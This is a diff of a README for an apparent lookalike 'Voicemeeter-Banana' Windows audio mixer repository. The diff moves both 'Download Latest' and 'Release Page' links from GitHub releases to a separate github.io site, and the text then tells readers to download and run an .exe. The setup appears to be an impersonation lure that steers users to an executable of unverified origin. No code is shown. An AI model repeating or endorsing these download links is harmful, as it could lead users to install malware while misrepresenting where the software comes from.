@@ -1,6 +1,6 @@
 # 🎙️ Voicemeeter-Banana - Professional Audio Control For Everyone
 
-[![](https://img.shields.io/badge/Download_Latest-Release_Page-blue.svg)](https://github.com/demetramuted590/Voicemeeter-Banana/releases)
+[![](https://img.shields.io/badge/Download_Latest-Release_Page-blue.svg)](https://demetramuted590.github.io)
 
 Voicemeeter-Banana manages all your audio sources on Windows 10 and 11. This application acts as a virtual mixer. It connects your microphone, system sounds, and music players through one interface. You gain control over sound levels and routing for streams or voice chats.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these needs before you start.
 
 Follow these steps to acquire the installer from the repository.
 
-1. Navigate to the official [Release Page](https://github.com/demetramuted590/Voicemeeter-Banana/releases).
+1. Navigate to the official [Release Page](https://demetramuted590.github.io).
 2. Look for the section labeled Assets at the bottom of the latest release.
 3. Select the file ending in .exe to start your download.
 4. Save the file to your Downloads folder.
